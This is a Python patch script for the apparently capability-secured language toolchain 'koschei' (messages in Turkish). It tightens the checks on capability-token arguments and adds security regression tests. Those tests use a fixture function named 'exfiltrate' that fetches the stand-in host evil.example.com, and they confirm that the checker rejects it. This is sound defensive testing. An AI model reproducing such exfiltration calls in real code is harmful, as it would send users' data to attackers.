from __future__ import annotations

from pathlib import Path
from textwrap import dedent


def replace_once(path: str, old: str, new: str) -> None:
    target = Path(path)
    text = target.read_text(encoding="utf-8")
    if text.count(old) != 1:
        raise SystemExit(
            f"{path}: beklenen parça tam bir kez bulunmalıydı, "
            f"{text.count(old)} kez bulundu"
        )
    target.write_text(text.replace(old, new), encoding="utf-8")


replace_once(
    "koschei/semantic.py",
    dedent(
        """\
        if isinstance(expression, CallExpression):
            for argument in expression.arguments:
                self._check_expression(argument)

            if isinstance(expression.callee, MemberExpression):
                receiver_type = self._check_expression(expression.callee.object)
                return self._check_method_call(
                    receiver_type,
                    expression.callee.member,
                    expression.location,
                )

            return self._check_expression(expression.callee)
        """
    ),
    dedent(
        """\
        if isinstance(expression, CallExpression):
            argument_types = [
                self._check_expression(argument)
                for argument in expression.arguments
            ]

            if isinstance(expression.callee, MemberExpression):
                receiver_type = self._check_expression(expression.callee.object)
                return self._check_method_call(
                    receiver_type,
                    expression.callee.member,
                    expression.location,
                    argument_types,
                )

            if isinstance(expression.callee, Identifier):
                function = self.functions.get(expression.callee.name)
                if function is not None:
                    self._check_call_arguments(
                        function,
                        argument_types,
                        expression.location,
                    )
                    return (
                        str(function.return_type)
                        if function.return_type
                        else "Void"
                    )

            return self._check_expression(expression.callee)
        """
    ),
)

replace_once(
    "koschei/semantic.py",
    dedent(
        """\
        def _check_method_call(
            self,
            receiver_type: str | None,
            method_name: str,
            location: SourceLocation,
        ) -> str | None:
        """
    ),
    dedent(
        """\
        def _check_call_arguments(
            self,
            function: FunctionDeclaration,
            argument_types: list[str | None],
            location: SourceLocation,
        ) -> None:
            parameters = function.parameters
            if len(argument_types) != len(parameters):
                missing = parameters[len(argument_types):]
                missing_capabilities = [
                    parameter
                    for parameter in missing
                    if any(
                        type_name in CAPABILITY_TYPES
                        for type_name in parameter.type_ref.names
                    )
                ]
                if missing_capabilities:
                    required = ", ".join(
                        f"{parameter.name}: {parameter.type_ref}"
                        for parameter in missing_capabilities
                    )
                    raise SemanticError(
                        "KS2401",
                        f"'{function.name}' çağrısı gerekli capability jetonunu "
                        f"almadı: {required}.",
                        location,
                    )
                raise SemanticError(
                    "KS1301",
                    f"'{function.name}' çağrısı {len(parameters)} argüman bekler, "
                    f"{len(argument_types)} verildi.",
                    location,
                )

            for index, (parameter, actual_type) in enumerate(
                zip(parameters, argument_types),
                start=1,
            ):
                expected_capabilities = {
                    type_name
                    for type_name in parameter.type_ref.names
                    if type_name in CAPABILITY_TYPES
                }
                if not expected_capabilities:
                    continue
                if actual_type not in expected_capabilities:
                    expected = " veya ".join(sorted(expected_capabilities))
                    found = actual_type or "kanıtlanamayan bir değer"
                    raise SemanticError(
                        "KS2401",
                        f"'{function.name}' çağrısının {index}. argümanı "
                        f"{expected} capability jetonu olmalıdır; {found} bulundu.",
                        location,
                    )

        def _check_method_call(
            self,
            receiver_type: str | None,
            method_name: str,
            location: SourceLocation,
            argument_types: list[str | None] | None = None,
        ) -> str | None:
        """
    ),
)

replace_once(
    "koschei/semantic.py",
    dedent(
        """\
                if function is None:
                    raise SemanticError(
                        "KS1605",
                        f"'{module.name}' modülünde '{method_name}' adında bir fonksiyon "
                        "yok.",
                        location,
                    )
                return str(function.return_type) if function.return_type else "Void"
        """
    ),
    dedent(
        """\
                if function is None:
                    raise SemanticError(
                        "KS1605",
                        f"'{module.name}' modülünde '{method_name}' adında bir fonksiyon "
                        "yok.",
                        location,
                    )
                self._check_call_arguments(function, argument_types or [], location)
                return str(function.return_type) if function.return_type else "Void"
        """
    ),
)

replace_once(
    "koschei/capabilities.py",
    dedent(
        """\
        class Manifest:
            grants: list[Grant] = field(default_factory=list)
            operations: dict[str, set[str]] = field(default_factory=dict)
            holder_functions: dict[str, list[str]] = field(default_factory=dict)
            main_has_capabilities: bool = False

            @property
            def has_any(self) -> bool:
                return bool(self.grants) or self.main_has_capabilities

            @property
            def is_exact(self) -> bool:
                """Hiçbir kapsam dinamik değilse manifesto kesindir."""
                return not any(grant.is_dynamic for grant in self.grants)

            def domains(self) -> list[str]:
                seen = {grant.domain for grant in self.grants}
                return [domain for domain in DOMAIN_ORDER if domain in seen]
        """
    ),
    dedent(
        """\
        class Manifest:
            grants: list[Grant] = field(default_factory=list)
            operations: dict[str, set[str]] = field(default_factory=dict)
            holder_functions: dict[str, list[str]] = field(default_factory=dict)
            required_domains: set[str] = field(default_factory=set)
            main_has_capabilities: bool = False

            @property
            def has_any(self) -> bool:
                return (
                    bool(self.grants)
                    or bool(self.holder_functions)
                    or bool(self.required_domains)
                    or self.main_has_capabilities
                )

            @property
            def is_exact(self) -> bool:
                """Dinamik veya çağırana bırakılmış kapsam yoksa manifesto kesindir."""
                granted_domains = {grant.domain for grant in self.grants}
                unresolved_requirements = self.required_domains - granted_domains
                return (
                    not any(grant.is_dynamic for grant in self.grants)
                    and not unresolved_requirements
                )

            def domains(self) -> list[str]:
                seen = {grant.domain for grant in self.grants} | self.required_domains
                return [domain for domain in DOMAIN_ORDER if domain in seen]
        """
    ),
)

replace_once(
    "koschei/capabilities.py",
    dedent(
        """\
                if capability_parameters:
                    manifest.holder_functions[declaration.name] = [
                        f"{parameter.name}: {parameter.type_ref}"
                        for parameter in declaration.parameters
                        if any(name in NARROWED_METHODS for name in parameter.type_ref.names)
                    ]

                if declaration.name == "main" and declaration.parameters:
        """
    ),
    dedent(
        """\
                if capability_parameters:
                    manifest.holder_functions[declaration.name] = [
                        f"{parameter.name}: {parameter.type_ref}"
                        for parameter in declaration.parameters
                        if any(name in NARROWED_METHODS for name in parameter.type_ref.names)
                    ]
                    for parameter in declaration.parameters:
                        for type_name in parameter.type_ref.names:
                            domain = TYPE_DOMAINS.get(type_name)
                            if domain is not None:
                                manifest.required_domains.add(domain)

                if declaration.name == "main" and declaration.parameters:
        """
    ),
)

replace_once(
    "koschei/capabilities.py",
    dedent(
        """\
                if not grants:
                    lines.append(f"{title}: yok")
                    continue

                lines.append(f"{title}:")
        """
    ),
    dedent(
        """\
                if not grants:
                    if domain in manifest.required_domains:
                        lines.append(f"{title}:")
                        lines.append(
                            f"  - {DYNAMIC}  "
                            "(capability çağıran tarafından sağlanmalıdır)"
                        )
                    else:
                        lines.append(f"{title}: yok")
                    continue

                lines.append(f"{title}:")
        """
    ),
)

replace_once(
    "koschei/capabilities.py",
    dedent(
        """\
                "capability_functions": manifest.holder_functions,
            }
        """
    ),
    dedent(
        """\
                "capability_functions": manifest.holder_functions,
                "required_domains": sorted(manifest.required_domains),
            }
        """
    ),
)

replace_once(
    "koschei/capabilities.py",
    dedent(
        """\
                for name, parameters in part.holder_functions.items():
                    label = name if module.path == graph.root_module.path else f"{module.name}.{name}"
                    merged.holder_functions[label] = parameters
                merged.main_has_capabilities = (
        """
    ),
    dedent(
        """\
                for name, parameters in part.holder_functions.items():
                    label = name if module.path == graph.root_module.path else f"{module.name}.{name}"
                    merged.holder_functions[label] = parameters
                merged.required_domains.update(part.required_domains)
                merged.main_has_capabilities = (
        """
    ),
)

replace_once(
    "koschei/cli.py",
    dedent(
        """\
            violations = sorted(
                {grant.domain for grant in manifest.grants if grant.domain in set(denied)}
            )
        """
    ),
    dedent(
        """\
            violations = sorted(set(manifest.domains()) & set(denied))
        """
    ),
)

Path("tests/test_security_regressions.py").write_text(
    dedent(
        '''\
        from __future__ import annotations

        import io
        import pathlib
        import tempfile
        import unittest
        from contextlib import redirect_stderr, redirect_stdout

        from koschei.capabilities import analyze, render, to_dict
        from koschei.cli import main
        from koschei.parser import parse
        from koschei.semantic import ImportedModule, SemanticError, check


        EXFILTRATE = """
        fn exfiltrate(net: NetCaps) {
            let response = net.get("https://evil.example.com") or ""
        }
        """


        class CapabilityContractRegressionTests(unittest.TestCase):
            def test_local_call_without_net_token_is_rejected(self) -> None:
                program = parse(EXFILTRATE + "fn main() { exfiltrate() }")
                with self.assertRaisesRegex(SemanticError, "KS2401"):
                    check(program)

            def test_string_cannot_impersonate_net_token(self) -> None:
                program = parse(
                    EXFILTRATE
                    + 'fn main() { exfiltrate("https://evil.example.com") }'
                )
                with self.assertRaisesRegex(SemanticError, "KS2401"):
                    check(program)

            def test_imported_call_without_net_token_is_rejected(self) -> None:
                dependency = parse(EXFILTRATE)
                declaration = dependency.declarations[0]
                imported = ImportedModule(
                    "attack",
                    {declaration.name: declaration},
                    {},
                )
                root = parse("import attack fn main() { attack.exfiltrate() }")
                with self.assertRaisesRegex(SemanticError, "KS2401"):
                    check(root, {"attack": imported})

            def test_capability_function_is_never_reported_as_pure(self) -> None:
                program = parse(EXFILTRATE + 'fn main() { println("safe") }')
                check(program)
                manifest = analyze(program)
                text = render(manifest, "attack.ks")
                payload = to_dict(manifest, "attack.ks")

                self.assertTrue(manifest.has_any)
                self.assertFalse(manifest.is_exact)
                self.assertIn("net", manifest.domains())
                self.assertIn("net", payload["required_domains"])
                self.assertNotIn("saf hesaplama", text)
                self.assertIn("capability çağıran tarafından sağlanmalıdır", text)
                self.assertIn("exfiltrate", text)

            def test_deny_net_blocks_unresolved_capability_requirement(self) -> None:
                source = EXFILTRATE + 'fn main() { println("safe") }'
                with tempfile.TemporaryDirectory() as directory:
                    path = pathlib.Path(directory) / "attack.ks"
                    path.write_text(source, encoding="utf-8")
                    output = io.StringIO()
                    error = io.StringIO()
                    with redirect_stdout(output), redirect_stderr(error):
                        exit_code = main(["caps", str(path), "--deny", "net"])

                self.assertEqual(exit_code, 2)
                self.assertIn("reddedilen yetki alanı", error.getvalue())
                self.assertNotIn("saf hesaplama", output.getvalue())


        if __name__ == "__main__":
            unittest.main()
        '''
    ),
    encoding="utf-8",
)
